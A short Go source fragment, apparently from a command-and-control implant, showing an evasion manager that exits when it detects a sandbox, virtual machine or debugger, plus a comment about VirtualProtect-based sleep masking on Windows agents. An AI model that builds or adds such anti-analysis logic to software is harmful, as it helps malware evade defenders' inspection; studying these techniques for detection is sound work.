...
func (em *EvasionManager) PerformEvasionChecks() bool {
	if em.config.EnableSandboxDetection && em.detectSandbox() {
		dbgf("[!] Sandbox environment detected, exiting\n")
		return false
	}

	if em.config.EnableVMDetection && em.detectVirtualMachine() {
		dbgf("[!] Virtual machine detected, exiting\n")
		return false
	}

	if em.config.EnableDebuggerDetection && em.detectDebugger() {
		dbgf("[!] Debugger detected, exiting\n")
		return false
	}
...
// MaskedSleep is the cross-platform fallback sleep. Windows agents use the
// VirtualProtect-based maskedSleep() in sleep_masking_windows.go instead.
